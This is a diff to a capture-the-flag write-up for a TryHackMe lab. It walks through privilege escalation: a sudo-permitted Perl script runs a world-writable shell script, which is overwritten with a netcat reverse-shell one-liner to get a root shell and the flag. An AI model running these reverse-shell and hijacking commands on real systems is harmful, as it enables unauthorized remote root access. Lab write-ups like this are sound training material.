@@ -381,7 +381,7 @@ THM{63e5bce9271952aad1113b6f1ac28a07}
 
 # Post Exploitation
 > Privilege Escalation
-27. `sudo -l` to list the sudo privileges assigned to the user that we're currently logged in as onto our terminal, which reveals that 
+27. `sudo -l` to list the sudo privileges assigned to the user that we're currently logged in as onto our terminal, which reveals that we can execute Perl commands and a Perl script using sudo without having to enter the root's password
 ```bash
 $ sudo -l
 Matching Defaults entries for www-data on THM-Chal:
@@ -390,26 +390,26 @@ Matching Defaults entries for www-data on THM-Chal:
 User www-data may run the following commands on THM-Chal:
     (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
 ```
-28. `cat /home/{USER}/{FILENAME3}.pl`
+28. `cat /home/{USER}/{FILENAME3}.pl` to display the contents of perl script onto our terminal, which reveals a bash (.sh) script that's to be executed once this script gets executed
 ```bash
 $ cat /home/itguy/backup.pl
 #!/usr/bin/perl
 
 system("sh", "/etc/copy.sh");
 ```
-29. `cat /etc/{FILENAME4}.sh`
-30. `ls -ali /etc/{FILENAME4}.sh`
+29. `cat /etc/{FILENAME4}.sh` to display the contents of the bash (.sh) script onto our terminal, which reveals a command sequence that's to be executed once this script gets executed that we'll adapt so that it matches our IP address and the chosen port number that we'll use for our second Netcat listener that this code sequence will make us connect to 
+30. `ls -li /etc/{FILENAME4}.sh` to display the inode number and set permissions for the bash (.sh) script, which reveals that we can read, write and execute the file
 ```bash
 $ cat /etc/copy.sh
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
 ```
 ```bash
-$ ls -ali /etc/copy.sh
+$ ls -li /etc/copy.sh
 1050508 -rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
 ```
-31. `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {MACHINE IP} {PORT NUMBER} >/tmp/f" > /etc/copy.sh`
-32. `nc -lvnp {PORT NUMBER}`
-33. `sudo /usr/bin/perl /home/itguy/backup.pl`
+31. `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {MACHINE IP} {PORT NUMBER} >/tmp/f" > /etc/copy.sh` to replace the content of the bash (.sh) script with the same code sequence but instead have the target connect to our machine
+32. `nc -lvnp {PORT NUMBER}` to open up another Netcat listener on the specified unoccupied port on our attack machine
+33. `sudo /usr/bin/perl /home/itguy/backup.pl` to execute the backup perl file, which will connect to our second Netcat listener and spawn a Bourne shell (sh), creating another reverse shell but with root privileges
 ```bash
 $ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.54.63 9998 >/tmp/f" > /etc/copy.sh
 ```
@@ -429,9 +429,9 @@ connect to [10.6.54.63] from (UNKNOWN) [10.10.165.242] 38970
 /bin/sh: 0: can't access tty; job control turned off
 # 
 ```
-34. `whoami`
-35. `ls /root`
-36. `cat /root/{ROOT FLAG}.txt`
+34. `whoami` to verify that we're now logged in as root, which we are
+35. `ls /root` to list the available files and directories within the target's **/root** directory, which reveals a root text file
+36. `cat /root/{ROOT FLAG}.txt` to display the root file's contents onto our terminal, which ended up containing the root flag for this challenge
 ```bash
 # whoami
 root
